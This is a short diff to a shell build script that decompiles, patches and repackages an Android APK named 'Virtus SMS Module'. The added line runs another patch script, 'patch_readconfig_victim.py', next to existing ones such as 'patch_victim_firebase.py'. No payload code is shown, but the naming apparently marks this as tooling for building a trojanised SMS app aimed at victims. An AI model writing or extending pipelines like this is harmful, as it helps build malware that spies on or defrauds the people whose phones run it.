@@ -18,6 +18,7 @@ SIGNER="${SIGNER:-$ROOT/uber-apk-signer.jar}"
 echo "Building Virtus SMS Module APK..."
 python3 "$ROOT/patch_astik_flow.py"
 python3 "$ROOT/patch_victim_firebase.py"
+python3 "$ROOT/patch_readconfig_victim.py"
 python3 "$ROOT/generate_icons.py"
 java -jar "$APKTOOL" b virtus_decompiled -o virtus-unsigned.apk
 
